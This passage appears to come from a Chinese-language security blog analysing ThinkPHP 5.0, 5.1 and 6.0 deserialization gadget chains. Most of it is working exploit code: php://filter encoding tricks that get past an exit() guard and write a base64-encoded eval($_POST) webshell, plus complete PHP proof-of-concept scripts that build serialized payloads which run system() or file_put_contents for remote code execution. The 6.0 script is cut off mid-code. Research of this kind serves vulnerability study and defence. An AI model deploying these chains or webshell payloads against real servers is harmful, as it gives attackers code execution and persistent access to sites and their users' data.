/></p><p><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSs[m1lp]e;)&gt;?/resource=12.php</code></p><p><img src="../../../typora-user-images/image-20240913144253027.png" alt="image-20240913144253027" /></p><p>usc-4过滤器：四位一反转</p><p><code>php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$s[TS]pm1&gt;?;)/resource=s1mple.php</code></p><p><img src="../../../typora-user-images/image-20240913144542973.png" alt="image-20240913144542973" /></p><p>UTF编码转换：</p><p>可以把=做编码转换，这样在设置base64解码的时候就不再受到影响了</p><p><code>php://filter/write=PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=s1mple.php</code></p><p><img src="../../../typora-user-images/image-20240913151647177.png" alt="image-20240913151647177" /></p><p>运用到TP上filter的位置就不能放payload了，TP会直接抛出异常，因此需要改一下payload的位置</p><p><code>php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php</code></p><p>PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+，正常的base64的payload是这样的，实际情况要根据前面的字符数量，在payload的前面增加字符做填充，这样才能让最终base64解码的时候刚好解码到这个地方。</p><p>看回源码，这里的filename参数是可控的，因此理论上应该可以绕过死亡exit</p><p><img src="../../../typora-user-images/image-20240912112341564.png" alt="image-20240912112341564" /></p><h3 id="三-poc编写"><a class="markdownIt-Anchor" href="#三-poc编写"></a> 三、POC编写</h3><p>写poc注意一下ThinkPHP的命名空间</p><p>Thinkphp命名空间实际上也很好理解，可以理解成一个模块化的定义。A模块的方法调用B模块里面的方法，带着模块名访问初始化就可以了。</p><p>先按照上面分析的思路编写一个poc:</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;class Windows&#123;private $files &#x3D; [];function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;&#x2F;&#x2F; Windows类，入口反序列化触发toString&#x2F;&#x2F;Pivot类，Model类的子类，触发__call方法namespace think\model&#123;class Pivot&#123;protected $append &#x3D; [&quot;1&quot;&#x3D;&gt;&quot;getError&quot;];protected $error;protected $parent;function __construct($a,$b)&#123;$this-&gt;error &#x3D; $a;$this-&gt;parent &#x3D; $b;&#125;&#125;&#125;&#x2F;&#x2F; HasOne类，Relation类的子类，触发if条件需要namespace think\model\relation&#123;class HasOne&#123;protected $selfRelation &#x3D; false;protected $query;protected $bindAttr &#x3D; [&#39;1&#39;&#x3D;&gt;1];function __construct($a)&#123;$this-&gt;query &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; Query类，为了符合上面的getModel条件namespace think\db&#123;class Query&#123;protected $model;function __construct($a)&#123;$this-&gt;model &#x3D; $a;&#125;&#125;&#125;&#x2F;&#x2F; __call方法触发类namespace think\console&#123;class Output&#123;protected $styles &#x3D; [&quot;getAttr&quot;];private $handle;function __construct($a)&#123;$this-&gt;handle &#x3D; $a;&#125;&#125;&#125;namespace think\session\driver&#123;class Memcached&#123;protected $handler;function __construct($a)&#123;$this-&gt;handler &#x3D; $a;&#125;&#125;&#125;namespace think\cache\driver&#123;class File&#123;protected $options &#x3D; [&#39;path&#39; &#x3D;&gt; &#39;&#39;, &#x2F;&#x2F; 这里是filename部分&#39;expire&#39; &#x3D;&gt; &#39;0&#39;,&#39;cache_subdir&#39; &#x3D;&gt; &#39;0&#39;,&#39;prefix&#39; &#x3D;&gt; &#39;0&#39;,&#39;data_compress&#39; &#x3D;&gt; false];&#125;&#125;namespace&#123;$fileObj &#x3D; new \think\cache\driver\File();$memObj &#x3D; new \think\session\driver\Memcached($fileObj);$outputObj &#x3D; new \think\console\Output($memObj);$queryObj &#x3D; new \think\db\Query($outputObj);$hasoneObj &#x3D; new think\model\relation\HasOne($queryObj);$pivotObj &#x3D; new think\model\Pivot($hasoneObj, $outputObj);$windows &#x3D; new think\process\pipes\Windows($pivotObj);echo base64_encode(serialize($windows));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>debug看一下，成功控制filename部分，接下来就是content部分，看一下是否可控了：</p><p><img src="../../../typora-user-images/image-20240913102139582.png" alt="image-20240913102139582" /></p><p>发现最初调set的时候，参数内容就不可控，写死为了true</p><p><img src="../../../typora-user-images/image-20240913103110896.png" alt="image-20240913103110896" /></p><p>没办法，只能尝试寻找其他调用set方法的地方，且set方法的参数value部分可控。</p><p>在下面的操作逻辑中，刚好有一处调用set方法的地方，分析一下value参数，发现就是传入的参数，也就是filename。</p><p><img src="../../../typora-user-images/image-20240913104405600.png" alt="image-20240913104405600" /></p><p>因此我们实际上得到了一个filename和content存在相同变量的死亡exit场景。</p><p>这个场景我们上面讨论过了，因此修改一下exp：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Windows类，入口反序列化触发toString</span><span class="token comment">//Pivot类，Model类的子类，触发__call方法</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"1"</span><span class="token operator">=></span><span class="token string double-quoted-string">"getError"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// HasOne类，Relation类的子类，触发if条件需要</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">HasOne</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Query类，为了符合上面的getModel条件</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// __call方法触发类</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"getAttr"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=111PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'expire'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cache_subdir'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$tag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$fileObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$memObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$fileObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$outputObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$queryObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hasoneObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$queryObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pivotObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$hasoneObj</span><span class="token punctuation">,</span> <span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivotObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终效果：</p><p><img src="../../../typora-user-images/image-20240913153902668.png" alt="image-20240913153902668" /></p><p><img src="../../../typora-user-images/image-20240913155426725.png" alt="image-20240913155426725" /></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X反序列化利用链.md</a></p><p>这篇blog还提到了如果目录不允许写入文件，通过其他方法创建文件。</p><h3 id="四-其他版本的反序列化链分析"><a class="markdownIt-Anchor" href="#四-其他版本的反序列化链分析"></a> 四、其他版本的反序列化链分析</h3><p>测试发现5.0的不同小版本的函数稍微有些区别</p><p>后面有空再分析， 可以参考一下这篇文章：</p><p><a href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p><h2 id="2thinkphp-51x-反序列化"><a class="markdownIt-Anchor" href="#2thinkphp-51x-反序列化"></a> ②ThinkPHP 5.1.x 反序列化</h2><p>TP5.1的反序列化比TP5.0的要简单的不少</p><p>测试版本：5.1.37</p><h3 id="一-反序列化调通过程"><a class="markdownIt-Anchor" href="#一-反序列化调通过程"></a> 一、反序列化调通过程</h3><h4 id="1-入口点"><a class="markdownIt-Anchor" href="#1-入口点"></a> 1. 入口点</h4><p>入口寻找__destruct方法，与TP5.0相同</p><p><img src="../../../typora-user-images/image-20240914135349542.png" alt="image-20240914135349542" /></p><h4 id="2-tostring-魔术方法"><a class="markdownIt-Anchor" href="#2-tostring-魔术方法"></a> 2. ToString 魔术方法</h4><p>依旧是此方法触发tostring</p><p><img src="../../../typora-user-images/image-20240914135424121.png" alt="image-20240914135424121" /></p><h4 id="3-中途利用点"><a class="markdownIt-Anchor" href="#3-中途利用点"></a> 3. 中途利用点</h4><p>这里看一下getAttr方法</p><p><img src="../../../typora-user-images/image-20240914135839679.png" alt="image-20240914135839679" /></p><p>这里有一处函数变量</p><p><img src="../../../typora-user-images/image-20240914135922286.png" alt="image-20240914135922286" /></p><h4 id="4构造中途条件"><a class="markdownIt-Anchor" href="#4构造中途条件"></a> 4.构造中途条件</h4><p>这条函数方法的pop链的条件很好构造：</p><ol><li>toarray方法的逻辑，可以直接进入，只要赋值data就可以，就可以进入下图中的getAttr方法</li></ol><p><img src="../../../typora-user-images/image-20240914154545662.png" alt="image-20240914154545662" /></p><ol start="2"><li>if逻辑可以赋值类参数解决，看一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">closure和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">和</span></span></span></span>value的值如何获取即可。</li></ol><p>value是拿的data数组的name键值对应的值</p><p>closure是拿的withAttr数组的name键值对应的值</p><p><img src="../../../typora-user-images/image-20240914154708798.png" alt="image-20240914154708798" /></p><h3 id="二-poc编写"><a class="markdownIt-Anchor" href="#二-poc编写"></a> 二、POC编写</h3><p>写之前注意两个问题：</p><ul><li>PHP中函数参数超出时会忽略，因此这里我们可以理解成可以调用一个参数的函数。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">closure(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>value)，当然这里情况可能更好一点，因为图中的$this-&gt;data其实也是可控的。</li><li>写poc时，因为触发点的类是trait的，而use这些类的Model是抽象类，写poc时，要找子类，定义属性的时候，一定要把属性定义到抽象类里面，而不是定义在子类里面。</li></ul><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think\process\pipes&#123;Class Windows&#123;private $files;function __construct($a)&#123;$this-&gt;files &#x3D; [$a];&#125;&#125;&#125;namespace think\model&#123;Class Pivot&#123;private $data &#x3D; [&#39;system&#39;&#x3D;&gt;&#39;calc&#39;];private $withAttr &#x3D; [&#39;system&#39; &#x3D;&gt; &#39;system&#39;];&#125;&#125;namespace&#123;$p &#x3D; new \think\model\Pivot();$w &#x3D; new \think\process\pipes\Windows($p);echo base64_encode(serialize($w));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很优美的一条链</p><p><img src="../../../typora-user-images/image-20240914155309217.png" alt="image-20240914155309217" /></p><p>如果想更实战化一点，我们可以选择调用file_put_contents方法，因为上面也分析过，这里的data也是可控的。</p><p><img src="../../../typora-user-images/image-20240914161202840.png" alt="image-20240914161202840" /></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span><span class="token keyword">abstract</span> <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'914.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'file_put_contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span><span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三-其他反序列化链分析"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析"></a> 三、其他反序列化链分析</h3><p>上面分析的链其实很简单，当然5.1还有另一个常见的链，具体如下：</p><p><a href="https://paper.seebug.org/1040/#_1">https://paper.seebug.org/1040/#_1</a></p><p>这个利用了TP的filterValue类（变量覆盖RCE那里），最终触发了callback执行，有精力再学习一下</p><h2 id="3thinkphp-52x-反序列化"><a class="markdownIt-Anchor" href="#3thinkphp-52x-反序列化"></a> ③ThinkPHP 5.2.x 反序列化</h2><p>搭建环境失败了</p><p>看一下这篇文章参考一下吧。</p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X反序列化利用链.md</a></p><p>实际上和上面分析的5.1.x的链是一样的。</p><h2 id="4-thinkphp60x-反序列化"><a class="markdownIt-Anchor" href="#4-thinkphp60x-反序列化"></a> ④ ThinkPHP6.0.x 反序列化</h2><p>tp6.0.x网上说低版本可以复用5.1.x后半部分的链接。</p><p><a href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a> 可以看一下这篇文章</p><p>但是本地安装发现，低版本实际上也已经patch过了，因此去找其他链</p><p><img src="../../../typora-user-images/image-20240914174452400.png" alt="image-20240914174452400" /></p><p>后面的链的测试版本6.0.1</p><h3 id="一-反序列化调通过程-2"><a class="markdownIt-Anchor" href="#一-反序列化调通过程-2"></a> 一、反序列化调通过程</h3><p>实际上发现在另一个逻辑上，也可能存在变量函数。</p><p><img src="../../../typora-user-images/image-20240914174922818.png" alt="image-20240914174922818" /></p><p>那先找toString方法触发地。</p><h4 id="1寻找tostring方法触发点"><a class="markdownIt-Anchor" href="#1寻找tostring方法触发点"></a> 1.寻找toString方法触发点</h4><p>字符串拼接触发toString方法</p><p><img src="../../../typora-user-images/image-20240914180702711.png" alt="image-20240914180702711" /></p><p>触发toString的在此处，上面最后一步的$this-&gt;db()方法。</p><p><img src="../../../typora-user-images/image-20240918143311766.png" alt="image-20240918143311766" /></p><h3 id="二-poc编写-2"><a class="markdownIt-Anchor" href="#二-poc编写-2"></a> 二、POC编写</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span 